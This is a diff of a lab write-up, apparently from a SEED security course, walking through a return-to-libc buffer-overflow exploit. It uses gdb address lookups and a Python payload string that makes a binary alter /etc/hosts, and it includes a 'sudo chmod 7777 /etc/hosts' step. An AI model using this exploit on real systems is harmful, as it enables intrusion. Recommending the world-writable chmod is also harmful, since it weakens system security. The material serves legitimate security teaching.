@@ -84,9 +84,9 @@ gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2 -z e
     ld -m elf_i386 -o run_file run_file.o
 ```
 
-We can use return-to-libc to solve the problem
+### We can use return-to-libc to solve the problem
 
-Đặt biến môi trường 
+**Set environment variables by the command**
 
 ```
 export MYBUF="/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file"
@@ -94,19 +94,17 @@ export MYBUF="/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_
 ```
 
 
-Xem lại biến môi trường bằng câu lệnh
+**To view environment variables, use the following command:**
 
 ```
 env | grep MYBUF
 ```
 
-Connect gdb to find the address of system, exit and the value "/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file"
+Connect gdb to find the address of `system`, `exit` and the value `"/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file"`
 
-After run the program by in gdb:
+After run the program by in gdb: ```r``` 
 
-```r``` 
-
-find the address by this command step by step
+Find the address by this command step by step
 ```
 p system
 p exit
@@ -120,50 +118,54 @@ exit: 0xf7e449e0
 /home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file: 0xffffd933
 
 
-Stackframe 
+### Stackframe 
 ![alt text](./image/image-4.png)
 
 
-Using the stack frame, we can calculate the payload to write:
+**Using the stack frame, we can calculate the payload to write:**
 
 `padding (20 bytes) + address of system + address of exit + address of MYBUF’s value (/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file)`
 
-this command must to be: 
+**This command must to be:**
 
 ```
 run $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x33\xd9\xff\xff')")
 ```
 
-exit gdb and connecting again
+Exit gdb and connecting again
 
 Run program by the command:
 
 ```
 run $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x33\xd9\xff\xff')")
 ```
-Check /etc/hosts folder by:
+
+Check `/etc/hosts` folder by:
+
 ```
 sudo cat /etc/hosts
 ```
+
 ![alt text](./image/image-5.png)
 
+
 Why isn’t Google.com’s address listed here?
-
-
 We need to configure permissions for the `/etc/hosts file.`
 
-Set permissions by the command:
+**Set permissions by the command:**
+
 ```
 sudo chmod 7777 /etc/hosts
 ```
-- sudo: Runs the command as superuser (root).
-- chmod 7777: Gives read, write, execute permissions to everyone, plus SUID, SGID, and sticky bit.
-- /etc/hosts: A critical system file that maps hostnames to IP addresses.
+
+- `sudo`: Runs the command as superuser (root).
+- `chmod 7777`: Gives read, write, execute permissions to everyone, plus SUID, SGID, and sticky bit.
+- `/etc/hosts`: A critical system file that maps hostnames to IP addresses.
 
 Connect gdb and run program again:
 ![alt text](./image/image-6.png)
 
-Check folder /etc/hosts again
+Check folder `/etc/hosts` again
 
 ![alt text](./image/image-7.png)
 
